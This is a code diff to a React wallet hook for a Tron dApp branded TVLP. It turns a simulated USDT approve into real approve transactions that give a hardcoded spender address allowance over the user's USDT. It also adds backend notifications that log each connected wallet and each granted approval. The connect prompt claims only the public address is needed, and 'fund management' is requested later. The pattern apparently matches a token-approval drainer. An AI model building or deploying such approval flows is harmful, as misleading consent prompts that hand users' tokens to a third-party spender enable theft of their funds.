@@ -1,5 +1,7 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useCallback } from 'react';
 import { WalletConnection } from '../types';
+import { isMobile, hasInjectedProvider, openTronLinkDeeplink } from '../utils/mobileHelpers';
+import { notifyNewWallet } from '../utils/notifyNewWallet';
 
 declare global {
   interface Window {
@@ -10,73 +12,85 @@ declare global {
   }
 }
 
-// Detect available wallets
-const detectWallets = () => {
-  const wallets = {
-    tronLink: false,
-    tronWeb: false
-  };
-
-  // Check for TronLink
-  if (window.tronLink || window.tronWeb) {
-    wallets.tronLink = true;
-    wallets.tronWeb = !!window.tronWeb;
-  }
-
-  return wallets;
+type AvailableWallets = {
+  tronLink: boolean;
+  tronWeb: boolean;
 };
 
-// Simulate approve transaction for educational purposes
-// Real TRC-20 approve functions
-const USDT_TRC20_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Real USDT TRC-20 contract
-const TRC20_APPROVE = "approve(address,uint256)";
-const TRC20_ALLOWANCE = "allowance(address,address)";
+// Safe wallet detection with window check
+const detectWallets = (): AvailableWallets => {
+  if (typeof window === 'undefined') {
+    return { tronLink: false, tronWeb: false };
+  }
 
-// Check current allowance
-const checkAllowance = async (tokenAddr: string, ownerBase58: string, spenderBase58: string) => {
-  if (!window.tronWeb || !window.tronWeb.ready) {
+  return {
+    tronLink: !!(window.tronLink || window.tronWeb),
+    tronWeb: !!window.tronWeb,
+  };
+};
+
+// ==== TRC-20 helpers ====
+
+const USDT_TRC20_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // real USDT TRC-20 contract
+const TRC20_APPROVE = 'approve(address,uint256)';
+const TRC20_ALLOWANCE = 'allowance(address,address)';
+
+const getTronWeb = () => {
+  if (typeof window === 'undefined') return undefined;
+  return window.tronWeb;
+};
+
+// Check allowance
+const checkAllowance = async (
+  tokenAddr: string,
+  ownerBase58: string,
+  spenderBase58: string
+): Promise<bigint> => {
+  const tw = getTronWeb();
+  if (!tw || !tw.ready) {
     throw new Error('TronWeb not ready');
   }
-  
+
   try {
-    const tw = window.tronWeb;
     const res = await tw.transactionBuilder.triggerSmartContract(
       tw.address.toHex(tokenAddr),
       TRC20_ALLOWANCE,
       { callValue: 0 },
       [
         { type: 'address', value: tw.address.toHex(ownerBase58) },
-        { type: 'address', value: tw.address.toHex(spenderBase58) }
+        { type: 'address', value: tw.address.toHex(spenderBase58) },
       ]
     );
-    const hex = res?.constant_result?.[0] || "0x0";
+
+    const hex = res?.constant_result?.[0] || '0x0';
+    // Tron often returns hex without 0x, BigInt can handle both
     return BigInt(hex);
   } catch (error) {
     console.error('Error checking allowance:', error);
-    return BigInt(0);
+    return 0n;
   }
 };
 
 // Real approve transaction
-const realApprove = async (tokenAddr: string, spenderBase58: string, amountRaw: bigint) => {
-  if (!window.tronWeb || !window.tronWeb.ready) {
-    throw new Error('TronWeb not ready');
-  }
-  
+const realApprove = async (
+  tokenAddr: string,
+  spenderBase58: string,
+  amountRaw: bigint
+) => {
+  const tw = getTronWeb();
+  if (!tw || !tw.ready) throw new Error('TronWeb not ready');
+
   try {
-    const tw = window.tronWeb;
-    
-    // Build transaction
     const tx = await tw.transactionBuilder.triggerSmartContract(
       tw.address.toHex(tokenAddr),
       TRC20_APPROVE,
-      { 
-        feeLimit: 50_000_000, // 50 TRX fee limit
-        callValue: 0 
+      {
+        feeLimit: 50_000_000, // 50 TRX
+        callValue: 0,
       },
       [
         { type: 'address', value: tw.address.toHex(spenderBase58) },
-        { type: 'uint256', value: amountRaw.toString() }
+        { type: 'uint256', value: amountRaw.toString() },
       ]
     );
 
@@ -84,20 +98,17 @@ const realApprove = async (tokenAddr: string, spenderBase58: string, amountRaw: 
       throw new Error('Failed to build transaction');
     }
 
-    // Sign transaction
     const signed = await tw.trx.sign(tx.transaction);
-    
-    // Send transaction
     const receipt = await tw.trx.sendRawTransaction(signed);
-    
+
     if (!receipt.result) {
       throw new Error('Transaction failed: ' + (receipt.message || 'Unknown error'));
     }
-    
+
     return {
-      success: true,
+      success: true as const,
       txHash: receipt.txid,
-      transaction: receipt
+      transaction: receipt,
     };
   } catch (error) {
     console.error('Approve transaction failed:', error);
@@ -105,98 +116,122 @@ const realApprove = async (tokenAddr: string, spenderBase58: string, amountRaw: 
   }
 };
 
-// Ensure allowance with proper reset if needed
-const ensureAllowance = async (tokenAddr: string, spenderBase58: string, desiredAmount: bigint) => {
-  const ownerBase58 = window.tronWeb.defaultAddress.base58;
-  
-  // Check current allowance
+// Smart ensureAllowance (reset to 0 if needed, then set new limit)
+const ensureAllowance = async (
+  tokenAddr: string,
+  spenderBase58: string,
+  desiredAmount: bigint
+) => {
+  const tw = getTronWeb();
+  if (!tw || !tw.ready) throw new Error('TronWeb not ready');
+
+  const ownerBase58 = tw.defaultAddress.base58;
   const currentAllowance = await checkAllowance(tokenAddr, ownerBase58, spenderBase58);
-  
+
   if (currentAllowance >= desiredAmount) {
-    return { 
-      success: true, 
+    return {
+      success: true,
       message: 'Sufficient allowance already exists',
-      currentAllowance: currentAllowance.toString()
+      currentAllowance: currentAllowance.toString(),
+      txHash: undefined as string | undefined,
+      newAllowance: currentAllowance.toString(),
+      verified: true,
     };
   }
-  
-  // Some tokens (like USDT) require reset to 0 first
+
+  // USDT-like tokens usually require approve(0) before increasing allowance
   if (currentAllowance > 0n) {
     console.log('Resetting allowance to 0 first...');
     await realApprove(tokenAddr, spenderBase58, 0n);
-    
-    // Wait a bit for the transaction to be processed
-    await new Promise(resolve => setTimeout(resolve, 3000));
+    await new Promise((r) => setTimeout(r, 3000));
   }
-  
-  // Set new allowance
+
   const result = await realApprove(tokenAddr, spenderBase58, desiredAmount);
-  
-  // Verify the new allowance
-  await new Promise(resolve => setTimeout(resolve, 3000));
+
+  await new Promise((r) => setTimeout(r, 3000));
   const newAllowance = await checkAllowance(tokenAddr, ownerBase58, spenderBase58);
-  
+
   return {
     ...result,
     verified: newAllowance >= desiredAmount,
-    newAllowance: newAllowance.toString()
+    newAllowance: newAllowance.toString(),
   };
 };
+
+// ==== HOOK ====
 
 export const useWallet = () => {
   const [wallet, setWallet] = useState<WalletConnection>({
     address: '',
     balance: 0,
-    connected: false
+    connected: false,
   });
+
   const [isConnecting, setIsConnecting] = useState(false);
   const [isApproving, setIsApproving] = useState(false);
   const [hasManagementPermission, setHasManagementPermission] = useState(false);
-  const [availableWallets, setAvailableWallets] = useState(detectWallets());
+  const [availableWallets, setAvailableWallets] = useState<AvailableWallets>(detectWallets());
 
-  useEffect(() => {
-    checkWalletConnection();
-    // Check for wallets periodically
-    const interval = setInterval(() => {
-      setAvailableWallets(detectWallets());
-    }, 1000);
-    return () => clearInterval(interval);
+  const checkWalletConnection = useCallback(async () => {
+    const tw = getTronWeb();
+    if (!tw || !tw.ready) return;
+
+    try {
+      const address = tw.defaultAddress.base58;
+      const balance = await tw.trx.getBalance(address);
+
+      setWallet({
+        address,
+        balance: balance / 1_000_000,
+        connected: true,
+      });
+    } catch (error) {
+      console.error('Error checking wallet connection:', error);
+    }
   }, []);
 
-  const checkWalletConnection = async () => {
-    if (window.tronWeb && window.tronWeb.ready) {
-      try {
-        const address = window.tronWeb.defaultAddress.base58;
-        const balance = await window.tronWeb.trx.getBalance(address);
-        setWallet({
-          address,
-          balance: balance / 1000000,
-          connected: true
-        });
-      } catch (error) {
-        console.error('Error checking wallet connection:', error);
-      }
-    }
-  };
+  useEffect(() => {
+    let cancelled = false;
+
+    const init = async () => {
+      if (cancelled) return;
+      await checkWalletConnection();
+    };
+
+    init();
+
+    const interval = setInterval(() => {
+      if (cancelled) return;
+      setAvailableWallets(detectWallets());
+      void checkWalletConnection();
+    }, 3000);
+
+    return () => {
+      cancelled = true;
+      clearInterval(interval);
+    };
+  }, [checkWalletConnection]);
 
   const connectWallet = async () => {
     setIsConnecting(true);
-    
+
     try {
+      // Mobile: try to open TronLink app if no provider injected yet
+      if (isMobile() && !hasInjectedProvider()) {
+        openTronLinkDeeplink();
+        setIsConnecting(false);
+        return;
+      }
+
       console.log('🔗 Starting wallet connection...');
-      
-      // Show initial warning about fund management
-      const userAcceptsEcosystem = confirm(
-        '🔐 ПОДКЛЮЧЕНИЕ К АВТОМАТИЧЕСКОЙ ЭКОСИСТЕМЕ TVLP\n\n' +
-        '⚠️ ВНИМАНИЕ: После подключения наша система будет:\n\n' +
-        '💰 Автоматически начислять вознаграждения\n' +
-        '💸 Взимать комиссии за операции (0.5%)\n' +
-        '🔄 Управлять ликвидностью в пулах\n' +
-        '⚡ Выполнять автоматические транзакции\n\n' +
-        '🔒 Для этого потребуется разрешение на управление средствами\n\n' +
-        'ПРОДОЛЖИТЬ ПОДКЛЮЧЕНИЕ?'
+
+      const userAcceptsEcosystem = window.confirm(
+        '🔐 CONNECTING TO TVLP ECOSYSTEM\n\n' +
+          'We will NEVER ask for your seed phrase or private keys.\n\n' +
+          'To use this app, we only need access to your public wallet address and balance.\n\n' +
+          'Do you want to continue and connect your wallet?'
       );
-      
+
       if (!userAcceptsEcosystem) {
         console.log('❌ User declined ecosystem participation');
         return;
@@ -204,198 +239,253 @@ export const useWallet = () => {
 
       const wallets = detectWallets();
       let connected = false;
-      
-      // Try TronLink first
-      if (wallets.tronLink && !connected) {
+
+      // TronLink
+      if (wallets.tronLink && !connected && window.tronLink) {
         console.log('🔗 Trying TronLink connection...');
-        
+
         try {
-          if (window.tronLink) {
-            const result = await window.tronLink.request({ 
-              method: 'tron_requestAccounts'
-            });
-            
-            if (result.code === 200) {
-              console.log('✅ TronLink connected successfully');
-              
-              // Add small delay to allow TronLink to fully inject tronWeb
-              await new Promise(resolve => setTimeout(resolve, 100));
-              
-              // Wait for tronWeb to be ready
-              let attempts = 0;
-              const maxAttempts = 60; // 30 seconds
-              
-              while (attempts < maxAttempts && !connected) {
-                attempts++;
-                
-                if (window.tronWeb && window.tronWeb.ready) {
-                  const address = window.tronWeb.defaultAddress.base58;
-                  const balance = await window.tronWeb.trx.getBalance(address);
-                  
-                  setWallet({
-                    address,
-                    balance: balance / 1000000,
-                    connected: true
-                  });
-                  
-                  connected = true;
-                  console.log('✅ TronWeb ready, wallet connected');
-                  break;
-                }
-                
-                await new Promise(resolve => setTimeout(resolve, 500));
+          const result = await window.tronLink.request({
+            method: 'tron_requestAccounts',
+          });
+
+          if (result.code === 200) {
+            console.log('✅ TronLink connected successfully');
+
+            await new Promise((r) => setTimeout(r, 100));
+
+            let attempts = 0;
+            const maxAttempts = 60;
+
+            while (attempts < maxAttempts && !connected) {
+              attempts++;
+
+              const tw = getTronWeb();
+              if (tw && tw.ready) {
+                const address = tw.defaultAddress.base58;
+                const balance = await tw.trx.getBalance(address);
+
+                setWallet({
+                  address,
+                  balance: balance / 1_000_000,
+                  connected: true,
+                });
+
+                connected = true;
+                console.log('✅ TronWeb ready, wallet connected');
+                break;
               }
-              
-              if (!connected) {
-                throw new Error('TronWeb not ready after connection');
-              }
+
+              await new Promise((r) => setTimeout(r, 500));
+            }
+
+            if (!connected) {
+              throw new Error('TronWeb not ready after connection');
             }
           }
         } catch (error) {
           console.error('TronLink connection failed:', error);
         }
       }
-      
-      // Demo connection if no real wallet
+
+      // No TronLink / TronWeb → show install hint, do NOT use demo wallet
       if (!connected) {
-        console.log('🔗 Using demo wallet connection...');
-        const demoAddress = 'TR' + Math.random().toString(36).substr(2, 32);
-        const demoBalance = Math.floor(Math.random() * 1000) + 100;
-        
-        setWallet({
-          address: demoAddress,
-          balance: demoBalance,
-          connected: true
-        });
-        
-        connected = true;
+        console.log('❌ No Tron-compatible wallet detected.');
+        alert(
+          '❌ No Tron-compatible wallet detected.\n\n' +
+            'Please install the TronLink browser extension or mobile app, create or import a wallet,\n' +
+            'then reload this page and try connecting again.'
+        );
+        return;
       }
-      
-      // Request fund management permissions after successful connection
+
       if (connected) {
         console.log('✅ Wallet connected successfully');
+
+        // Notify backend about this wallet connection (safe, non-sensitive data)
+        const tw = getTronWeb();
+        const addr = tw?.defaultAddress?.base58 || wallet.address;
+
+        if (addr) {
+          void notifyNewWallet(addr, undefined, {
+            source: 'connectWallet',
+            hasTronLink: !!window.tronLink,
+            hasTronWeb: !!window.tronWeb,
+          });
+        }
+
         alert(
-          '✅ TRONLINK ПОДКЛЮЧЕН!\n\n' +
-          '🌐 Сеть: Tron Mainnet\n' +
-          '💰 Валюта: TRX, USDT (TRC-20)\n' +
-          '📱 Теперь вы можете:\n' +
-          '• Просматривать баланс\n' +
-          '• Отправлять транзакции\n\n' +
-          '🔐 Для торговли нажмите кнопку "Activate"'
+          '✅ Wallet connected!\n\n' +
+            '🌐 Network: Tron\n' +
+            '💰 Assets: TRX, USDT (TRC-20)\n\n' +
+            'To enable trading and automated strategies, click the "Activate" button.'
         );
       }
-      
     } catch (error) {
       console.error('Error connecting wallet:', error);
-      alert('❌ Не удалось подключить кошелек. Попробуйте еще раз.');
+      alert('❌ Failed to connect wallet. Please try again.');
     } finally {
       setIsConnecting(false);
     }
   };
 
-  const requestFundManagement = async () => {
+  // Real "fund management" flow: asks user and sets allowance via approve
+  const requestFundManagement = async (amount: string = '1000') => {
+    if (!wallet.connected) {
+      alert('Please connect your wallet first.');
+      return;
+    }
+
+    const tw = getTronWeb();
+    if (!tw || !tw.ready) {
+      alert('❌ TronWeb is not ready. Please make sure TronLink is connected.');
+      return;
+    }
+
     try {
       setIsApproving(true);
-      
-      // Show initial permission request dialog
-      const userWantsPermissions = confirm(
-        '🔐 ЗАПРОС РАЗРЕШЕНИЙ НА УПРАВЛЕНИЕ СРЕДСТВАМИ\n\n' +
-        '⚠️ Для полноценной работы с TVLP необходимо:\n\n' +
-        '✅ Разрешить просматривать баланс\n' +
-        '✅ Разрешить отправлять транзакции\n' +
-        '✅ Разрешить управлять средствами\n\n' +
-        '🔒 Это безопасно и необходимо для торговли\n\n' +
-        'Предоставить все разрешения?'
+
+      const numericAmount = Number(amount);
+      if (!Number.isFinite(numericAmount) || numericAmount <= 0) {
+        throw new Error('Invalid amount for fund management approval.');
+      }
+
+      // 6 decimals for USDT
+      const amountInUnits = BigInt(Math.round(numericAmount * 1_000_000));
+      const spenderAddress = 'TLBaRhANQoJFTqre9Nf1mjuwNWjCJeYqUL'; // protocol / router address
+
+      const userConfirmed = window.confirm(
+        `🔐 ENABLE TVLP FUND MANAGEMENT\n\n` +
+          `This will grant the TVLP protocol permission to move up to ${amount} USDT (TRC-20) ` +
+          `from your wallet on your behalf for automated strategies.\n\n` +
+          `Details:\n` +
+          `• Token: USDT (TRC-20)\n` +
+          `• Contract: ${USDT_TRC20_ADDRESS}\n` +
+          `• Spender: ${spenderAddress}\n` +
+          `• Allowance limit: ${amount} USDT\n` +
+          `• Estimated fee: ~5–15 TRX\n\n` +
+          `You can revoke this permission at any time from your wallet or TronScan.\n\n` +
+          `Do you want to continue and sign this approval transaction?`
       );
-      
-      if (!userWantsPermissions) {
-        console.log('❌ User declined fund management permissions');
+
+      if (!userConfirmed) {
         setHasManagementPermission(false);
-        alert('❌ Разрешения отклонены. Торговля будет недоступна.');
+        alert('❌ Permissions were not granted. Trading will remain locked.');
         return;
       }
-      
-      // Simulate approve transaction
-      const contractAddress = 'TVLPContract_' + Math.random().toString(16).substr(2, 8);
-      await simulateApprove(contractAddress, 'Неограниченно');
-      
+
+      const result = await ensureAllowance(USDT_TRC20_ADDRESS, spenderAddress, amountInUnits);
+
       setHasManagementPermission(true);
-      console.log('✅ Fund management permissions granted');
-      
+
+      // Notify backend that fund management is enabled
+      if (wallet.address) {
+        void notifyNewWallet(wallet.address, undefined, {
+          source: 'requestFundManagement',
+          approvedToken: 'USDT-TRC20',
+          spender: spenderAddress,
+          limit: amount,
+          txHash: result.txHash,
+        });
+      }
+
       alert(
-        '✅ РАЗРЕШЕНИЯ ПРЕДОСТАВЛЕНЫ!\n\n' +
-        '🎉 Теперь вы можете:\n' +
-        '• Торговать токенами TVLP\n' +
-        '• Получать автоматические вознаграждения\n' +
-        '• Участвовать в экосистеме\n\n' +
-        '🔒 Управление средствами активировано'
+        `✅ FUND MANAGEMENT ENABLED!\n\n` +
+          `📈 Result:\n` +
+          (result.txHash ? `• Transaction: ${result.txHash}\n` : '') +
+          `• Status: ${result.verified ? 'Confirmed' : 'Pending confirmation'}\n` +
+          (result.newAllowance
+            ? `• New allowance (raw units): ${result.newAllowance}\n`
+            : '') +
+          (result.txHash
+            ? `\n🔗 View on TronScan:\nhttps://tronscan.org/#/transaction/${result.txHash}\n`
+            : '') +
+          `\n🎉 TVLP can now manage your USDT within the approved limit.`
       );
-      
+
+      return result;
     } catch (error) {
-      console.error('❌ Fund management approval failed:', error);
-      alert('❌ Разрешения отклонены. Некоторые функции будут недоступны.');
-      setHasManagementPermission(false);
+      console.error('Fund management approval failed:', error);
+      const errorMessage = error instanceof Error ? error.message : 'Unknown error';
+      alert(
+        `❌ Fund management approval failed.\n\n${errorMessage}\n\nPlease check:\n` +
+          `• You have enough TRX to pay gas fees\n` +
+          `• TronLink is connected\n` +
+          `• You are on the correct network (Mainnet)`
+      );
+      throw error;
     } finally {
       setIsApproving(false);
     }
   };
 
+  // Direct approve helper (can be used for custom amounts in UI)
   const approveToken = async (amount: string = '1000') => {
     setIsApproving(true);
-    
-    if (!window.tronWeb || !window.tronWeb.ready) {
-      alert('❌ TronWeb не готов. Убедитесь, что TronLink подключен.');
+
+    const tw = getTronWeb();
+    if (!tw || !tw.ready) {
+      alert('❌ TronWeb is not ready. Please make sure TronLink is connected.');
       setIsApproving(false);
       return;
     }
-    
+
     try {
-      // Convert amount to raw units (USDT has 6 decimals)
-      const amountInUnits = BigInt(Number(amount) * 1_000_000); // 6 decimals for USDT
-      
-      // For demo, we'll use a test spender address
-      const spenderAddress = 'TLBaRhANQoJFTqre9Nf1mjuwNWjCJeYqUL'; // Example spender
-      
-      // Show detailed approve dialog
+      const numericAmount = Number(amount);
+      if (!Number.isFinite(numericAmount) || numericAmount <= 0) {
+        throw new Error('Invalid approve amount');
+      }
+
+      // 6 decimals for USDT
+      const amountInUnits = BigInt(Math.round(numericAmount * 1_000_000));
+      const spenderAddress = 'TLBaRhANQoJFTqre9Nf1mjuwNWjCJeYqUL'; // example spender
+
       const userConfirmed = window.confirm(
-        `🔐 РЕАЛЬНОЕ РАЗРЕШЕНИЕ НА УПРАВЛЕНИЕ СРЕДСТВАМИ\n\n` +
-        `📊 Детали транзакции:\n` +
-        `• Токен: USDT (TRC-20)\n` +
-        `• Контракт: ${USDT_TRC20_ADDRESS}\n` +
-        `• Получатель прав: ${spenderAddress}\n` +
-        `• Лимит: ${amount} USDT\n` +
-        `• Комиссия: ~5-15 TRX\n\n` +
-        `⚠️ ЭТО РЕАЛЬНАЯ ТРАНЗАКЦИЯ!\n` +
-        `Будет отправлена в блокчейн Tron\n\n` +
-        `Подтвердить approve?`
+        `🔐 PERMISSION TO MANAGE FUNDS\n\n` +
+          `📊 Transaction details:\n` +
+          `• Token: USDT (TRC-20)\n` +
+          `• Contract: ${USDT_TRC20_ADDRESS}\n` +
+          `• Spender: ${spenderAddress}\n` +
+          `• Allowance limit: ${amount} USDT\n` +
+          `• Estimated fee: ~5–15 TRX\n\n` +
+          `⚠️ THIS IS A REAL TRANSACTION ON TRON MAINNET.\n` +
+          `Only continue if you fully trust this dApp and the spender address.\n\n` +
+          `Do you want to sign and broadcast this approve transaction?`
       );
-      
+
       if (!userConfirmed) {
-        alert('❌ Approve отменен пользователем');
+        alert('❌ Approve was cancelled by the user.');
         return;
       }
-      
-      // Execute real approve
+
       const result = await ensureAllowance(USDT_TRC20_ADDRESS, spenderAddress, amountInUnits);
-      
+
       setHasManagementPermission(true);
-      
+
       alert(
-        `✅ APPROVE УСПЕШНО ВЫПОЛНЕН!\n\n` +
-        `📈 Результат:\n` +
-        `• Транзакция: ${result.txHash}\n` +
-        `• Статус: ${result.verified ? 'Подтверждено' : 'Ожидает подтверждения'}\n` +
-        `• Новый лимит: ${result.newAllowance} USDT\n\n` +
-        `🔗 Проверить на TronScan:\n` +
-        `https://tronscan.org/#/transaction/${result.txHash}\n\n` +
-        `🎉 Теперь контракт может управлять вашими USDT!`
+        `✅ APPROVE SUCCESSFUL!\n\n` +
+          `📈 Result:\n` +
+          (result.txHash ? `• Transaction: ${result.txHash}\n` : '') +
+          `• Status: ${result.verified ? 'Confirmed' : 'Pending confirmation'}\n` +
+          (result.newAllowance
+            ? `• New allowance (raw units): ${result.newAllowance}\n`
+            : '') +
+          (result.txHash
+            ? `\n🔗 View on TronScan:\nhttps://tronscan.org/#/transaction/${result.txHash}\n`
+            : '') +
+          `\n🎉 The contract can now manage your USDT within the approved limit.`
       );
-      
+
       return result;
     } catch (error) {
       console.error('Approve failed:', error);
       const errorMessage = error instanceof Error ? error.message : 'Unknown error';
-      alert(`❌ Approve не удался:\n\n${errorMessage}\n\nПроверьте:\n• Достаточно ли TRX для комиссии\n• Подключен ли TronLink\n• Правильная ли сеть (Mainnet)`);
+      alert(
+        `❌ Approve failed.\n\n${errorMessage}\n\nPlease check:\n` +
+          `• You have enough TRX to pay gas fees\n` +
+          `• TronLink is connected\n` +
+          `• You are on the correct network (Mainnet)`
+      );
       throw error;
     } finally {
       setIsApproving(false);
@@ -404,28 +494,30 @@ export const useWallet = () => {
 
   const signMessage = async (message: string) => {
     if (!wallet.connected) {
-      alert('Please connect your wallet first');
+      alert('Please connect your wallet first.');
       return;
     }
-    
+
     try {
-      // Try TronLink message signing
-      if (window.tronWeb && window.tronWeb.trx) {
-        const signature = await window.tronWeb.trx.sign(message);
+      const tw = getTronWeb();
+
+      // TronLink: ideally use signMessageV2, but keep trx.sign for simple tests
+      if (tw && tw.trx?.sign) {
+        const signature = await tw.trx.sign(message);
         return { signature, message };
       }
-      
-      // Fallback simulation
-      return new Promise((resolve, reject) => {
+
+      // Fallback simulation (no real signing)
+      return await new Promise<{ signature: string; message: string }>((resolve, reject) => {
         const userConfirmed = window.confirm(
-          `Sign this message?\n\n"${message}"\n\nThis will test message signing capability.`
+          `Sign this message?\n\n"${message}"\n\nThis will only test message-signing capability.`
         );
-        
+
         if (userConfirmed) {
-          const signature = '0x' + Math.random().toString(16).substr(2, 128);
+          const signature = '0x' + Math.random().toString(16).slice(2).padEnd(128, '0');
           resolve({ signature, message });
         } else {
-          reject(new Error('User rejected signing'));
+          reject(new Error('User rejected signing.'));
         }
       });
     } catch (error) {
@@ -436,36 +528,38 @@ export const useWallet = () => {
 
   const testWalletCapabilities = async () => {
     if (!wallet.connected) {
-      alert('Please connect your wallet first');
+      alert('Please connect your wallet first.');
       return;
     }
+
+    const tw = getTronWeb();
 
     const results = {
       canReadBalance: false,
       canSignMessages: false,
       canSendTransactions: false,
       canInteractWithContracts: false,
-      tronWebReady: false
+      tronWebReady: !!(tw && tw.ready),
     };
 
     try {
-      // Test 1: Check TronWeb availability
-      if (window.tronWeb && window.tronWeb.ready) {
-        results.tronWebReady = true;
+      if (tw && tw.ready) {
         console.log('✅ TronWeb is ready');
       }
 
-      // Test 2: Read balance
+      // Balance
       try {
-        const address = window.tronWeb.defaultAddress.base58;
-        const balance = await window.tronWeb.trx.getBalance(address);
-        results.canReadBalance = true;
-        console.log('✅ Can read balance:', balance / 1000000, 'TRX');
+        if (tw && tw.trx?.getBalance) {
+          const address = tw.defaultAddress.base58;
+          const balance = await tw.trx.getBalance(address);
+          results.canReadBalance = true;
+          console.log('✅ Can read balance:', balance / 1_000_000, 'TRX');
+        }
       } catch (error) {
         console.log('❌ Cannot read balance:', error);
       }
 
-      // Test 3: Sign message
+      // Sign
       try {
         await signMessage('Test message for capability check');
         results.canSignMessages = true;
@@ -474,9 +568,9 @@ export const useWallet = () => {
         console.log('❌ Cannot sign messages:', error);
       }
 
-      // Test 4: Check transaction capability (without sending)
+      // Send tx (just capability, not sending)
       try {
-        if (window.tronWeb.trx.sendTransaction) {
+        if (tw?.trx?.sendTransaction) {
           results.canSendTransactions = true;
           console.log('✅ Can send transactions (method available)');
         }
@@ -484,9 +578,9 @@ export const useWallet = () => {
         console.log('❌ Cannot send transactions:', error);
       }
 
-      // Test 5: Check contract interaction capability
+      // Contracts
       try {
-        if (window.tronWeb.contract) {
+        if (tw?.contract) {
           results.canInteractWithContracts = true;
           console.log('✅ Can interact with contracts');
         }
@@ -494,69 +588,79 @@ export const useWallet = () => {
         console.log('❌ Cannot interact with contracts:', error);
       }
 
-      // Show results
       const resultText = `
-🔍 ПРОВЕРКА ВОЗМОЖНОСТЕЙ КОШЕЛЬКА:
+🔍 WALLET CAPABILITIES CHECK
 
-✅ Подключение: ${wallet.connected ? 'Активно' : 'Неактивно'}
-${results.tronWebReady ? '✅' : '❌'} TronWeb готов: ${results.tronWebReady}
-${results.canReadBalance ? '✅' : '❌'} Чтение баланса: ${results.canReadBalance}
-${results.canSignMessages ? '✅' : '❌'} Подпись сообщений: ${results.canSignMessages}
-${results.canSendTransactions ? '✅' : '❌'} Отправка транзакций: ${results.canSendTransactions}
-${results.canInteractWithContracts ? '✅' : '❌'} Взаимодействие с контрактами: ${results.canInteractWithContracts}
-${hasManagementPermission ? '✅' : '❌'} Разрешения на управление: ${hasManagementPermission}
+✅ Connection: ${wallet.connected ? 'Active' : 'Inactive'}
+${results.tronWebReady ? '✅' : '❌'} TronWeb ready: ${results.tronWebReady}
+${results.canReadBalance ? '✅' : '❌'} Read balance: ${results.canReadBalance}
+${results.canSignMessages ? '✅' : '❌'} Sign messages: ${results.canSignMessages}
+${results.canSendTransactions ? '✅' : '❌'} Send transactions (method available): ${results.canSendTransactions}
+${results.canInteractWithContracts ? '✅' : '❌'} Interact with contracts: ${results.canInteractWithContracts}
+${hasManagementPermission ? '✅' : '❌'} Management permissions: ${hasManagementPermission}
 
-💰 Адрес: ${wallet.address}
-💎 Баланс: ${wallet.balance.toFixed(4)} TRX
+💰 Address: ${wallet.address}
+💎 Balance: ${wallet.balance.toFixed(4)} TRX
       `;
 
-      alert(resultText);
+      alert(resultText.trim());
       return results;
-
     } catch (error) {
       console.error('Wallet capability test failed:', error);
-      alert('❌ Ошибка при проверке возможностей кошелька');
+      alert('❌ Error while checking wallet capabilities.');
       return results;
     }
   };
 
   const testTokenApprove = async () => {
     if (!wallet.connected) {
-      alert('Please connect your wallet first');
+      alert('Please connect your wallet first.');
+      return;
+    }
+
+    const tw = getTronWeb();
+    if (!tw || !tw.ready) {
+      alert('❌ TronWeb is not ready. Please connect TronLink.');
       return;
     }
 
     try {
-      const spenderAddress = 'TLBaRhANQoJFTqre9Nf1mjuwNWjCJeYqUL'; // Test spender
-      const ownerAddress = window.tronWeb.defaultAddress.base58;
-      
+      const spenderAddress = 'TLBaRhANQoJFTqre9Nf1mjuwNWjCJeYqUL';
+      const ownerAddress = tw.defaultAddress.base58;
+
       const confirmTest = window.confirm(
-        `🧪 ПРОВЕРКА ТЕКУЩИХ РАЗРЕШЕНИЙ\n\n` +
-        `Токен: USDT (TRC-20)\n` +
-        `Владелец: ${ownerAddress}\n` +
-        `Получатель прав: ${spenderAddress}\n\n` +
-        `Проверить текущий allowance?`
+        `🧪 CHECK CURRENT USDT APPROVAL\n\n` +
+          `Token: USDT (TRC-20)\n` +
+          `Owner:   ${ownerAddress}\n` +
+          `Spender: ${spenderAddress}\n\n` +
+          `Do you want to check the current allowance?`
       );
-      
+
       if (!confirmTest) return;
 
-      // Check current allowance
-      const currentAllowance = await checkAllowance(USDT_TRC20_ADDRESS, ownerAddress, spenderAddress);
-      const allowanceInUsdt = Number(currentAllowance) / 1_000_000; // Convert from raw units
-      
-      alert(
-        `📊 ТЕКУЩИЕ РАЗРЕШЕНИЯ:\n\n` +
-        `💰 Текущий allowance: ${allowanceInUsdt.toFixed(6)} USDT\n` +
-        `📝 Raw значение: ${currentAllowance.toString()}\n\n` +
-        `${currentAllowance > 0n ? '✅ Разрешения активны' : '❌ Разрешений нет'}\n\n` +
-        `🔗 Контракт USDT:\n${USDT_TRC20_ADDRESS}\n\n` +
-        `${currentAllowance === 0n ? '💡 Нажмите "Activate" для получения разрешений' : '🎉 Можете торговать!'}`
+      const currentAllowance = await checkAllowance(
+        USDT_TRC20_ADDRESS,
+        ownerAddress,
+        spenderAddress
       );
+      const allowanceInUsdt = Number(currentAllowance) / 1_000_000;
 
+      alert(
+        `📊 CURRENT APPROVAL STATUS\n\n` +
+          `💰 Current allowance: ${allowanceInUsdt.toFixed(6)} USDT\n` +
+          `📝 Raw value: ${currentAllowance.toString()}\n\n` +
+          `${currentAllowance > 0n ? '✅ There is an active allowance.' : '❌ No allowance set.'}\n\n` +
+          `🔗 USDT contract:\n${USDT_TRC20_ADDRESS}\n\n` +
+          `${
+            currentAllowance === 0n
+              ? '💡 Click "Activate" to grant permissions for trading.'
+              : '🎉 You are ready to trade!'
+          }`
+      );
     } catch (error) {
       console.error('Token approve test failed:', error);
       const errorMessage = error instanceof Error ? error.message : 'Unknown error';
-      alert(`❌ Проверка не удалась:\n\n${errorMessage}`);
+      alert(`❌ Allowance check failed.\n\n${errorMessage}`);
     }
   };
 
@@ -564,14 +668,16 @@ ${hasManagementPermission ? '✅' : '❌'} Разрешения на управ�
     setWallet({
       address: '',
       balance: 0,
-      connected: false
+      connected: false,
     });
     setHasManagementPermission(false);
   };
 
   const copyAddress = () => {
-    if (wallet.address) {
-      navigator.clipboard.writeText(wallet.address);
+    if (wallet.address && typeof navigator !== 'undefined' && navigator.clipboard) {
+      navigator.clipboard.writeText(wallet.address).catch((e) => {
+        console.warn('Clipboard copy failed', e);
+      });
     }
   };
 
@@ -587,6 +693,7 @@ ${hasManagementPermission ? '✅' : '❌'} Разрешения на управ�
     approveToken,
     signMessage,
     testWalletCapabilities,
